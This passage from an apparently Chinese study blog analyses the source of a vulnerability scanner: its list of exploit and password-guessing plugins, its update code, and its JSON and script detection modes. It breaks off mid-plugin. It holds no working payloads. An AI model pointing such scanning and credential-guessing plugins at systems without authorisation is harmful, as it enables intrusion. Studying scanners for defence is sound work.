class="line">│   ├── <span class="selector-tag">jboss_rce_un</span><span class="selector-class">.py</span></span><br><span class="line">│   ├── <span class="selector-tag">jenkins_CVE_2015_8103</span><span class="selector-class">.py</span></span><br><span class="line">│   ├── <span class="selector-tag">jenkins_CVE_2017_1000353</span><span class="selector-class">.py</span></span><br><span class="line">│   ├── <span class="selector-tag">jetty_refer</span><span class="selector-class">.py</span></span><br><span class="line">│   ├── <span class="selector-tag">memcache_drdos</span><span class="selector-class">.py</span></span><br><span class="line">│   ├── <span class="selector-tag">memcache_unauth</span><span class="selector-class">.py</span></span><br><span class="line">│   ├── <span class="selector-tag">netgear_passwd</span><span class="selector-class">.json</span></span><br><span class="line">│   ├── <span class="selector-tag">nginx_CVE_2017_7529</span><span class="selector-class">.py</span></span><br><span class="line">│   ├── <span class="selector-tag">nodejs_debugger_rce</span><span class="selector-class">.py</span></span><br><span class="line">│   ├── <span class="selector-tag">phpmyadmin_crackpass</span><span class="selector-class">.py</span></span><br><span class="line">│   ├── <span class="selector-tag">resin_fileread</span><span class="selector-class">.json</span></span><br><span class="line">│   ├── <span class="selector-tag">resin_fileread_1</span><span class="selector-class">.json</span></span><br><span class="line">│   ├── <span class="selector-tag">resin_fileread_3</span><span class="selector-class">.json</span></span><br><span class="line">│   ├── <span class="selector-tag">rsync_weak_auth</span><span class="selector-class">.py</span></span><br><span class="line">│   ├── <span class="selector-tag">s2_052</span><span class="selector-class">.py</span></span><br><span class="line">│   ├── <span class="selector-tag">shiro_550</span><span class="selector-class">.py</span></span><br><span class="line">│   ├── <span class="selector-tag">st2_eval</span><span class="selector-class">.py</span></span><br><span class="line">│   ├── <span class="selector-tag">svn_entries_disclosure</span><span class="selector-class">.json</span></span><br><span class="line">│   ├── <span class="selector-tag">testing</span><span class="selector-class">.py</span></span><br><span class="line">│   ├── <span class="selector-tag">tomcat_crackpass</span><span class="selector-class">.py</span></span><br><span class="line">│   ├── <span class="selector-tag">tomcat_cve_017_12615</span><span class="selector-class">.py</span></span><br><span class="line">│   ├── <span class="selector-tag">web_fileread</span><span class="selector-class">.py</span></span><br><span class="line">│   ├── <span class="selector-tag">web_shellshock</span><span class="selector-class">.py</span></span><br><span class="line">│   ├── <span class="selector-tag">weblogic_CVE_2015_4852</span><span class="selector-class">.py</span></span><br><span class="line">│   ├── <span class="selector-tag">weblogic_CVE_2017_10271</span><span class="selector-class">.py</span></span><br><span class="line">│   ├── <span class="selector-tag">weblogic_CVE_2018_2628</span><span class="selector-class">.py</span></span><br><span class="line">│   ├── <span class="selector-tag">weblogic_ssrf</span><span class="selector-class">.json</span></span><br><span class="line">│   ├── <span class="selector-tag">websphere_CVE_2015_7450</span><span class="selector-class">.py</span></span><br><span class="line">│   ├── <span class="selector-tag">wordpress_crackpass</span><span class="selector-class">.py</span></span><br><span class="line">│   ├── <span class="selector-tag">zabbix_jsrpc_SQL</span><span class="selector-class">.json</span></span><br><span class="line">│   ├── <span class="selector-tag">zabbix_latest_sql</span><span class="selector-class">.py</span></span><br><span class="line">│   └── <span class="selector-tag">zookeeper_unauth_access</span><span class="selector-class">.py</span></span><br><span class="line">└── <span class="selector-tag">vulscan</span><span class="selector-class">.py</span></span><br></pre></td></tr></table></figure><p>这里学长让我看看这几个文件：</p><ul><li><code>vulscan/vulscan.py</code></li><li><code>nascan/nascan.py</code></li><li><code>web.py(但这个只是一个Flask入口.....)</code></li></ul><p>那就主要是前两个文件了，其他文件都是<code>Flask</code>的模板文件之类的，如果分析完那两个文件之后，感觉可以看看</p><h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><p>导入库就先不看了，遇到了就追回去看看</p><p>第16-17行</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sys.path.append(sys.path[<span class="number">0</span>] + <span class="string">'/vuldb'</span>)</span><br><span class="line">sys.path.append(sys.path[<span class="number">0</span>] + <span class="string">"/../"</span>)</span><br></pre></td></tr></table></figure><p>这两句在于把<code>/vuldb</code>和上层目录加入<code>python</code>解析器的搜索路径里</p><p>然后开始连接<code>MongoDB</code>数据库，之前已经配置好了，这些用来获那些结果、插件、设置等等</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">db_conn = pymongo.MongoClient(ProductionConfig.DB, ProductionConfig.PORT)</span><br><span class="line">na_db = getattr(db_conn, ProductionConfig.DBNAME)</span><br><span class="line">na_db.authenticate(ProductionConfig.DBUSERNAME, ProductionConfig.DBPASSWORD)</span><br><span class="line">na_task = na_db.Task</span><br><span class="line">na_result = na_db.Result</span><br><span class="line">na_plugin = na_db.Plugin</span><br><span class="line">na_config = na_db.Config</span><br><span class="line">na_heart = na_db.Heartbeat</span><br><span class="line">na_update = na_db.Update</span><br></pre></td></tr></table></figure><p>然后生成一个多线程的锁</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">lock = thread.allocate()</span><br></pre></td></tr></table></figure><p>这几个目前不知道是干什么的，除了那个超时和多线程以外</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">PASSWORD_DIC = []</span><br><span class="line">THREAD_COUNT = <span class="number">50</span></span><br><span class="line">TIMEOUT = <span class="number">10</span></span><br><span class="line">PLUGIN_DB = &#123;&#125;</span><br><span class="line">TASK_DATE_DIC = &#123;&#125;</span><br><span class="line">WHITE_LIST = []</span><br></pre></td></tr></table></figure><p>下面的<code>kp = kunpeng()</code></p><p>是实例化的<code>kunpeng</code>类，这玩意好像是个漏洞库？</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200324004438191.png" alt="image-20200324004438191"></p><p>这里来分析一下</p><hr><h2 id="kunpeng-py"><a href="#kunpeng-py" class="headerlink" title="kunpeng.py"></a>kunpeng.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">  self.kunpeng = <span class="literal">None</span></span><br><span class="line">  self.system = platform.system().lower()</span><br><span class="line">  self.pwd = os.path.split(os.path.realpath(__file__))[<span class="number">0</span>]</span><br><span class="line">  self.suf_map = &#123;</span><br><span class="line">    <span class="string">'windows'</span>: <span class="string">'.dll'</span>,</span><br><span class="line">    <span class="string">'darwin'</span>: <span class="string">'.dylib'</span>,</span><br><span class="line">    <span class="string">'linux'</span>: <span class="string">'.so'</span></span><br><span class="line">  &#125;</span><br><span class="line">  self._load_kunpeng()</span><br></pre></td></tr></table></figure><p>构造函数没啥好说的</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200324005230570.png" alt="image-20200324005230570"></p><p>得了当前路径，系统类型，以及好像是动态链接库的后缀？</p><p>最后调用了<code>_load_kunpeng()</code>方法</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_get_lib_path</span><span class="params">(self)</span>:</span></span><br><span class="line">  file_list = os.listdir(self.pwd)</span><br><span class="line">  <span class="keyword">for</span> v <span class="keyword">in</span> file_list:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'kunpeng'</span> <span class="keyword">in</span> v <span class="keyword">and</span> os.path.splitext(v)[<span class="number">1</span>] == self.suf_map[self.system]:</span><br><span class="line">      <span class="keyword">return</span> v</span><br></pre></td></tr></table></figure><p>这个函数先是读取了当前路径下的文件，然后检测文件名是否存在<code>kunpeng</code>并且后缀是否符合那个字典的要求，然后返回这个文件名</p><p>可以看到它实际上是用来寻找那个链接库</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200324005030207.png" alt="image-20200324005030207"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_version</span><span class="params">(self)</span>:</span></span><br><span class="line">  <span class="keyword">print</span> <span class="string">'check version'</span></span><br><span class="line">  release = self._get_release_latest()</span><br><span class="line">  <span class="comment"># print(release)</span></span><br><span class="line">  <span class="keyword">if</span> release[<span class="string">'tag_name'</span>] != self.get_version():</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'new version'</span>, release[<span class="string">'tag_name'</span>]</span><br><span class="line">    self._down_release(release[<span class="string">'tag_name'</span>])</span><br><span class="line">    <span class="keyword">return</span> release</span><br></pre></td></tr></table></figure><p>然后是检测版本信息，这里看看<code>_get_release_latest()</code>函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_get_release_latest</span><span class="params">(self)</span>:</span></span><br><span class="line">  body = urllib2.urlopen(</span><br><span class="line">    <span class="string">'https://api.github.com/repos/opensec-cn/kunpeng/releases/latest'</span>).read()</span><br><span class="line">  release = json.loads(body)</span><br><span class="line">  <span class="keyword">return</span> release</span><br></pre></td></tr></table></figure><p>可以看到是请求了，返回了请求的<code>json</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200324005530150.png" alt="image-20200324005530150"></p><p>然后判断是否有新版本，这里把版本获取函数没找到，看一下下载最新版本的函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_down_release</span><span class="params">(self, version)</span>:</span></span><br><span class="line">  <span class="keyword">print</span> <span class="string">'kunpeng update '</span>, version</span><br><span class="line">  save_path = self.pwd + \</span><br><span class="line">  <span class="string">'/kunpeng_&#123;&#125;_v&#123;&#125;.zip'</span>.format(self.system, version)</span><br><span class="line">  down_url = <span class="string">'https://github.com/opensec-cn/kunpeng/releases/download/&#123;&#125;/kunpeng_&#123;&#125;_v&#123;&#125;.zip'</span>.format(</span><br><span class="line">    version, self.system.lower(), version)</span><br><span class="line">  <span class="keyword">print</span> <span class="string">'url'</span>, down_url</span><br><span class="line">  urlretrieve(down_url, save_path, self._callbackinfo)</span><br></pre></td></tr></table></figure><p>这里很简单，把系统类型、版本号格式化进去之后进行下载，然后调用<code>urlretrieve</code>函数进行保存，其中<code>_callbackinfo</code>函数是个回调函数，用来显示下载进度</p><p><strong>_callbackinfo</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@down:已经下载的数据块 </span></span><br><span class="line"><span class="meta">@block:数据块的大小 </span></span><br><span class="line"><span class="meta">@size:远程文件的大小</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_callbackinfo</span><span class="params">(self, down, block, size)</span>:</span></span><br><span class="line">per = <span class="number">100.0</span>*(down*block)/size</span><br><span class="line"><span class="keyword">if</span> per &gt; <span class="number">100</span>:</span><br><span class="line">per = <span class="number">100</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'%.2f%%'</span> % per</span><br></pre></td></tr></table></figure><p>然后看看版本更新函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_version</span><span class="params">(self, version)</span>:</span></span><br><span class="line">  self.close()</span><br><span class="line">  os.remove(self.pwd + <span class="string">'/'</span> + self._get_lib_path())</span><br><span class="line">  save_path = self.pwd + \</span><br><span class="line">  <span class="string">'/kunpeng_&#123;&#125;_v&#123;&#125;.zip'</span>.format(self.system, version)</span><br><span class="line">  z_file = zipfile.ZipFile(save_path, <span class="string">'r'</span>)</span><br><span class="line">  dat = z_file.read(<span class="string">'kunpeng_c'</span> + self.suf_map[self.system])</span><br><span class="line">  <span class="keyword">print</span> len(dat)</span><br><span class="line">  new_lib = self.pwd + <span class="string">'/kunpeng_v'</span> + version + self.suf_map[self.system]</span><br><span class="line">  lib_f = open(new_lib,<span class="string">'wb'</span>)</span><br><span class="line">  lib_f.write(dat)</span><br><span class="line">  lib_f.close()</span><br><span class="line">  z_file.close()</span><br><span class="line">  <span class="keyword">print</span> <span class="string">'update success'</span>,version</span><br><span class="line">  self._load_kunpeng()</span><br></pre></td></tr></table></figure><p>这里先关闭<code>kunpeng</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">close</span><span class="params">(self)</span>:</span></span><br><span class="line">  <span class="keyword">if</span> self.system == <span class="string">'windows'</span>:</span><br><span class="line">    _ctypes.FreeLibrary(self.kunpeng._handle)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      handle = self.kunpeng._handle</span><br><span class="line">      <span class="keyword">del</span> self.kunpeng</span><br><span class="line">      _ctypes.dlclose(handle)</span><br></pre></td></tr></table></figure><p>这个<code>FreeLibraey</code>函数我没搜到，不过猜测作用是释放<code>Lib</code>的</p><p>在其他系统上是通过<code>del self.kunpeng</code>这个属性以及关闭句柄的</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200324011302856.png" alt="image-20200324011302856"></p><p>反正<code>ctypes</code>这个库感觉就是用来处理动态库的</p><p>然后通过读取下载的<code>zip</code>文件，把数据二进制方式写入一个新的文件里，加载了<code>_load_kunpeng()</code>方法进行了加载</p><p>这个方法就不写了，反正就是用了<code>ctypes</code>这个库进行了动态链接库加载以及参数设置</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">self.kunpeng.GetPlugins.restype = c_char_p</span><br><span class="line">self.kunpeng.Check.argtypes = [c_char_p]</span><br><span class="line">self.kunpeng.Check.restype = c_char_p</span><br><span class="line">self.kunpeng.SetConfig.argtypes = [c_char_p]</span><br><span class="line">self.kunpeng.GetVersion.restype = c_char_p</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200324012236228.png" alt="image-20200324012236228"></p><p><code>kunpeng.py</code>先到这里，继续分析<code>vulscan.py</code>，遇到了就回到看定义</p><hr><h2 id="vulscan-py"><a href="#vulscan-py" class="headerlink" title="vulscan.py"></a>vulscan.py</h2><p>构造函数没啥好看的，就直接看<code>start</code>函数了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">(self)</span>:</span></span><br><span class="line">    self.get_plugin_info()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'.json'</span> <span class="keyword">in</span> self.plugin_info[<span class="string">'filename'</span>]:  <span class="comment"># 标示符检测模式</span></span><br><span class="line">        self.load_json_plugin()  <span class="comment"># 读取漏洞标示</span></span><br><span class="line">        self.set_request()  <span class="comment"># 标示符转换为请求</span></span><br><span class="line">        self.poc_check()  <span class="comment"># 检测</span></span><br></pre></td></tr></table></figure><p>这里查询了插件的信息之后（通过<code>Mongo</code>来查询</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&gt; db.Plugin.find()</span><br><span class="line">&#123; <span class="attr">"_id"</span> : ObjectId(<span class="string">"5e797eb938e88b00324eb4bb"</span>), <span class="attr">"count"</span> : <span class="number">0</span>, <span class="attr">"add_time"</span> : ISODate(<span class="string">"2020-03-24T11:30:01.657Z"</span>), <span class="attr">"info"</span> : <span class="string">"导致数据库敏感信息泄露，严重可导致服务器被入侵。"</span>, <span class="attr">"name"</span> : <span class="string">"Redis弱口令"</span>, <span class="attr">"keyword"</span> : <span class="string">"server:redis"</span>, <span class="attr">"level"</span> : <span class="string">"高危"</span>, <span class="attr">"url"</span> : <span class="string">"http://www.freebuf.com/vuls/85021.html"</span>, <span class="attr">"author"</span> : <span class="string">"wolf@YSRC"</span>, <span class="attr">"filename"</span> : <span class="string">"crack_redis"</span>, <span class="attr">"source"</span> : <span class="number">1</span>, <span class="attr">"type"</span> : <span class="string">"弱口令"</span> &#125;</span><br><span class="line">&#123; <span class="attr">"_id"</span> : ObjectId(<span class="string">"5e797eb938e88b00324eb4bc"</span>), <span class="attr">"count"</span> : <span class="number">0</span>, <span class="attr">"add_time"</span> : ISODate(<span class="string">"2020-03-24T11:30:01.657Z"</span>), <span class="attr">"info"</span> : <span class="string">"攻击者通过此漏洞最终可以达到任意文件读取的效果。"</span>, <span class="attr">"name"</span> : <span class="string">".NET Padding Oracle信息泄露"</span>, <span class="attr">"keyword"</span> : <span class="string">"tag:aspx"</span>, <span class="attr">"level"</span> : <span class="string">"高危"</span>, <span class="attr">"url"</span> : <span class="string">""</span>, <span class="attr">"author"</span> : <span class="string">"wolf@YSRC"</span>, <span class="attr">"filename"</span> : <span class="string">"MS10-070"</span>, <span class="attr">"source"</span> : <span class="number">1</span>, <span class="attr">"type"</span> : <span class="string">"任意文件读取"</span> &#125;</span><br><span class="line">&#123; <span class="attr">"_id"</span> : ObjectId(<span class="string">"5e797eb938e88b00324eb4bd"</span>), <span class="attr">"count"</span> : <span class="number">0</span>, <span class="attr">"add_time"</span> : ISODate(<span class="string">"2020-03-24T11:30:01.657Z"</span>), <span class="attr">"info"</span> : <span class="string">"可直接执行任意代码，进而直接导致服务器被入侵控制。"</span>, <span class="attr">"name"</span> : <span class="string">"Jboss反序列化代码执行"</span>, <span class="attr">"keyword"</span> : <span class="string">"tag:jboss"</span>, <span class="attr">"level"</span> : <span class="string">"紧急"</span>, <span class="attr">"url"</span> : <span class="string">"http://www.freebuf.com/articles/86950.html"</span>, <span class="attr">"author"</span> : <span class="string">"wolf@YSRC"</span>, <span class="attr">"filename"</span> : <span class="string">"jboss_rce_un"</span>, <span class="attr">"source"</span> : <span class="number">1</span>, <span class="attr">"type"</span> : <span class="string">"代码执行"</span> &#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><p>他这里有三种检测方式</p><ul><li>json</li><li>kunpeng漏洞库</li><li>python脚本</li></ul><h4 id="json检测"><a href="#json检测" class="headerlink" title="json检测"></a>json检测</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">'.json'</span> <span class="keyword">in</span> self.plugin_info[<span class="string">'filename'</span>]:  <span class="comment"># 标示符检测模式</span></span><br><span class="line">  self.load_json_plugin()  <span class="comment"># 读取漏洞标示</span></span><br><span class="line">  self.set_request()  <span class="comment"># 标示符转换为请求</span></span><br><span class="line">  self.poc_check()  <span class="comment"># 检测</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_json_plugin</span><span class="params">(self)</span>:</span></span><br><span class="line">  json_plugin = open(sys.path[<span class="number">0</span>] + <span class="string">'/vuldb/'</span> +</span><br><span class="line">                     self.plugin_info[<span class="string">'filename'</span>]).read()</span><br><span class="line">  self.plugin_info[<span class="string">'plugin'</span>] = json.loads(json_plugin)[<span class="string">'plugin'</span>]</span><br></pre></td></tr></table></figure><p>读取他的<code>plugin</code>信息</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"name"</span> : <span class="string">"Axis2信息泄露"</span>,</span><br><span class="line">    <span class="attr">"info"</span> : <span class="string">"HappyAxis.jsp 页面存在系统敏感信息。"</span>,</span><br><span class="line">    <span class="attr">"level"</span> : <span class="string">"低危"</span>,</span><br><span class="line">    <span class="attr">"type"</span> : <span class="string">"信息泄露"</span>,</span><br><span class="line">    <span class="attr">"author"</span> : <span class="string">"wolf@YSRC"</span>,</span><br><span class="line">    <span class="attr">"url"</span>: <span class="string">""</span>,</span><br><span class="line"><span class="attr">"keyword"</span> : <span class="string">"tag:axis2"</span>,</span><br><span class="line"><span class="attr">"source"</span> : <span class="number">1</span>,</span><br><span class="line">    <span class="attr">"plugin"</span> : &#123;</span><br><span class="line">        <span class="attr">"url"</span> : <span class="string">"/axis2/axis2-web/HappyAxis.jsp"</span>,</span><br><span class="line">        <span class="attr">"tag"</span> : <span class="string">"敏感信息泄露"</span>,</span><br><span class="line">        <span class="attr">"analyzing"</span> : <span class="string">"keyword"</span>,</span><br><span class="line">        <span class="attr">"analyzingdata"</span> : <span class="string">"Axis2 Happiness Page"</span>,</span><br><span class="line">        <span class="attr">"data"</span> : <span class="string">""</span>,</span><br><span class="line">        <span class="attr">"method"</span> : <span class="string">"GET"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后开始把<code>json</code>里的<code>url</code>和请求方式转化为一个<code>urllib2.Request</code>请求</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_request</span><span class="params">(self)</span>:</span></span><br><span class="line">  url = <span class="string">'http://'</span> + \</span><br><span class="line">  self.task_netloc[<span class="number">0</span>] + <span class="string">":"</span> + \</span><br><span class="line">  str(self.task_netloc[<span class="number">1</span>]) + self.plugin_info[<span class="string">'plugin'</span>][<span class="string">'url'</span>]</span><br><span class="line">  <span class="keyword">if</span> self.plugin_info[<span class="string">'plugin'</span>][<span class="string">'method'</span>] == <span class="string">'GET'</span>:</span><br><span class="line">    request = urllib2.Request(url)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      request = urllib2.Request(url, self.plugin_info[<span class="string">'plugin'</span>][<span class="string">'data'</span>])</span><br><span class="line">      self.poc_request = request</span><br></pre></td></tr></table></figure><p>然后进行<code>POC</code>检测</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc_check</span><span class="params">(self)</span>:</span></span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    res = urllib2.urlopen(self.poc_request, timeout=<span class="number">30</span>)</span><br><span class="line">    res_html = res.read(<span class="number">204800</span>)</span><br><span class="line">    header = res.headers</span><br><span class="line">    <span class="comment"># res_code = res.code</span></span><br><span class="line">    <span class="keyword">except</span> urllib2.HTTPError, e:</span><br><span class="line">      <span class="comment"># res_code = e.code</span></span><br><span class="line">      header = e.headers</span><br><span class="line">      res_html = e.read(<span class="number">204800</span>)</span><br><span class="line">      <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="keyword">return</span></span><br></pre></td></tr></table></figure><p>前半部分是用来发送<code>HTTP</code>请求的，这里吐槽一下，不能直接用<code>request</code>库吗？？？</p><p>然后对页面进行了解码和编码操作</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">  html_code = self.get_code(header, res_html).strip()</span><br><span class="line">  <span class="keyword">if</span> html_code <span class="keyword">and</span> len(html_code) &lt; <span class="number">12</span>:</span><br><span class="line">    res_html = res_html.decode(html_code).encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">      <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>这时候对漏洞发现关键字进行检测：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">an_type = self.plugin_info[<span class="string">'plugin'</span>][<span class="string">'analyzing'</span>]</span><br><span class="line">vul_tag = self.plugin_info[<span class="string">'plugin'</span>][<span class="string">'tag'</span>]</span><br><span class="line">analyzingdata = self.plugin_info[<span class="string">'plugin'</span>][<span class="string">'analyzingdata'</span>]</span><br><span class="line"><span class="keyword">if</span> an_type == <span class="string">'keyword'</span>:</span><br><span class="line">  <span class="comment"># print poc['analyzingdata'].encode("utf-8")</span></span><br><span class="line">  <span class="keyword">if</span> analyzingdata.encode(<span class="string">"utf-8"</span>) <span class="keyword">in</span> res_html:</span><br><span class="line">    self.result_info = vul_tag</span><br><span class="line">    <span class="keyword">elif</span> an_type == <span class="string">'regex'</span>:</span><br><span class="line">      <span class="keyword">if</span> re.search(analyzingdata, res_html, re.I):</span><br><span class="line">        self.result_info = vul_tag</span><br><span class="line">        <span class="keyword">elif</span> an_type == <span class="string">'md5'</span>:</span><br><span class="line">          md5 = hashlib.md5()</span><br><span class="line">          md5.update(res_html)</span><br><span class="line">          <span class="keyword">if</span> md5.hexdigest() == analyzingdata:</span><br><span class="line">            self.result_info = vul_tag</span><br></pre></td></tr></table></figure><p>如果说是<code>keyword</code>的话，他会检测那个<code>analyzingdata</code>数据是否在页面里，是的话返回结果是那个标签</p><p>下面的<code>regex</code>是通过在页面正则查找某个内容，然后返回结果</p><p><code>md5</code>是通过对比页面的内容的<code>md5</code>和<code>analyzingdata</code>的差别，然后返回标签结果</p><h4 id="kunpeng检测"><a href="#kunpeng检测" class="headerlink" title="kunpeng检测"></a>kunpeng检测</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">elif</span> <span class="string">'KP-'</span> <span class="keyword">in</span> self.plugin_info[<span class="string">'filename'</span>]:</span><br><span class="line">  self.log(str(self.task_netloc) + <span class="string">'call kunpeng - '</span> + self.plugin_info[<span class="string">'filename'</span>])</span><br><span class="line">  kp.set_config(TIMEOUT, PASSWORD_DIC)</span><br><span class="line">  <span class="keyword">if</span> self.task_netloc[<span class="number">1</span>] != <span class="number">80</span>:</span><br><span class="line">    self.result_info = kp.check(<span class="string">'service'</span>, <span class="string">'&#123;&#125;:&#123;&#125;'</span>.format(</span><br><span class="line">      self.task_netloc[<span class="number">0</span>], self.task_netloc[<span class="number">1</span>]), self.plugin_info[<span class="string">'filename'</span>])</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> self.result_info:</span><br><span class="line">      scheme = <span class="string">'http'</span></span><br><span class="line">      <span class="keyword">if</span> self.task_netloc[<span class="number">1</span>] == <span class="number">443</span>:</span><br><span class="line">        scheme = <span class="string">'https'</span></span><br><span class="line">        self.result_info = kp.check(<span class="string">'web'</span>, <span class="string">'&#123;&#125;://&#123;&#125;:&#123;&#125;'</span>.format(</span><br><span class="line">          scheme, self.task_netloc[<span class="number">0</span>], self.task_netloc[<span class="number">1</span>]), self.plugin_info[<span class="string">'filename'</span>])</span><br></pre></td></tr></table></figure><p>这里的<code>log</code>方法通过上锁和开锁的方式来打印那个调用信息</p><p>这时候判断是否是<code>80</code>端口，如果不是的话调用<code>kunpeng</code>的<code>check</code>方法</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(self, t, netloc, kpid)</span>:</span></span><br><span class="line">  task_dic = &#123;</span><br><span class="line">    <span class="string">'type'</span>: t,</span><br><span class="line">    <span class="string">'netloc'</span>: netloc,</span><br><span class="line">    <span class="string">'target'</span>: kpid</span><br><span class="line">  &#125;</span><br><span class="line">  r = json.loads(self.kunpeng.Check(json.dumps(task_dic)))</span><br><span class="line">  result = <span class="string">''</span></span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> r:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line">  <span class="keyword">for</span> v <span class="keyword">in</span> r:</span><br><span class="line">    result += v[<span class="string">'remarks'</span>] + <span class="string">','</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>这里的<code>Check</code>方法找不到，但我推测应该是导入那个模块进行检测，然后返回<code>remarks</code>结果</p><p>如果发现<code>check</code>没有返回时，就认定他是<code>web</code>服务，通过设置协议、IP、端口号重新导入<code>kunpeng::check()</code>进行检测</p><h4 id="python脚本检测"><a href="#python脚本检测" class="headerlink" title="python脚本检测"></a>python脚本检测</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span>:  <span class="comment"># 脚本检测模式</span></span><br><span class="line">  plugin_filename = self.plugin_info[<span class="string">'filename'</span>]</span><br><span class="line">  self.log(str(self.task_netloc) + <span class="string">'call '</span> + self.task_plugin)</span><br><span class="line">  <span class="keyword">if</span> task_plugin <span class="keyword">not</span> <span class="keyword">in</span> PLUGIN_DB:</span><br><span class="line">    plugin_res = __import__(plugin_filename)</span><br><span class="line">    setattr(plugin_res, <span class="string">"PASSWORD_DIC"</span>, PASSWORD_DIC)  <span class="comment"># 给插件声明密码字典</span></span><br><span class="line">    PLUGIN_DB[plugin_filename] = plugin_res</span><br><span class="line">    self.result_info = PLUGIN_DB[plugin_filename].check(</span><br><span class="line">      str(self.task_netloc[<span class="number">0</span>]), int(self.task_netloc[<span class="number">1</span>]), TIMEOUT)</span><br><span class="line">    self.save_request()  <span class="comment"># 保存结果</span></span><br></pre></td></tr></table></figure><p>这边如果任务插件不在那个<code>PLUGIN_DB</code>的话</p><p>就动态<code>import</code>那个插件py文件</p><p>这个<code>setattr(plugin_res, &quot;PASSWORD_DIC&quot;, PASSWORD_DIC)  # 给插件声明密码字典</code></p><p>是用来给弱口令啥的增加字典的</p><p>然后就是把<code>import</code>的那个<code>py</code>导入到一个字典里，然后调用那个<code>py</code>文件的<code>check</code>方法，这里随便拿一个举个例子</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="comment"># author:wolf</span></span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_plugin_info</span><span class="params">()</span>:</span></span><br><span class="line">    plugin_info = &#123;</span><br><span class="line">        <span class="string">"name"</span>: <span class="string">"Axis2控制台弱口令"</span>,</span><br><span class="line">        <span class="string">"info"</span>: <span class="string">"攻击者通过此漏洞可以登陆管理控制台，通过部署功能可直接获取服务器权限。"</span>,</span><br><span class="line">        <span class="string">"level"</span>: <span class="string">"高危"</span>,</span><br><span class="line">        <span class="string">"type"</span>: <span class="string">"弱口令"</span>,</span><br><span class="line">        <span class="string">"author"</span>: <span class="string">"wolf@YSRC"</span>,</span><br><span class="line">        <span class="string">"url"</span>: <span class="string">"http://www.codesec.net/view/247352.html"</span>,</span><br><span class="line">        <span class="string">"keyword"</span>: <span class="string">"tag:axis"</span>,</span><br><span class="line">        <span class="string">"source"</span>: <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> plugin_info</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(host, port, timeout)</span>:</span></span><br><span class="line">    url = <span 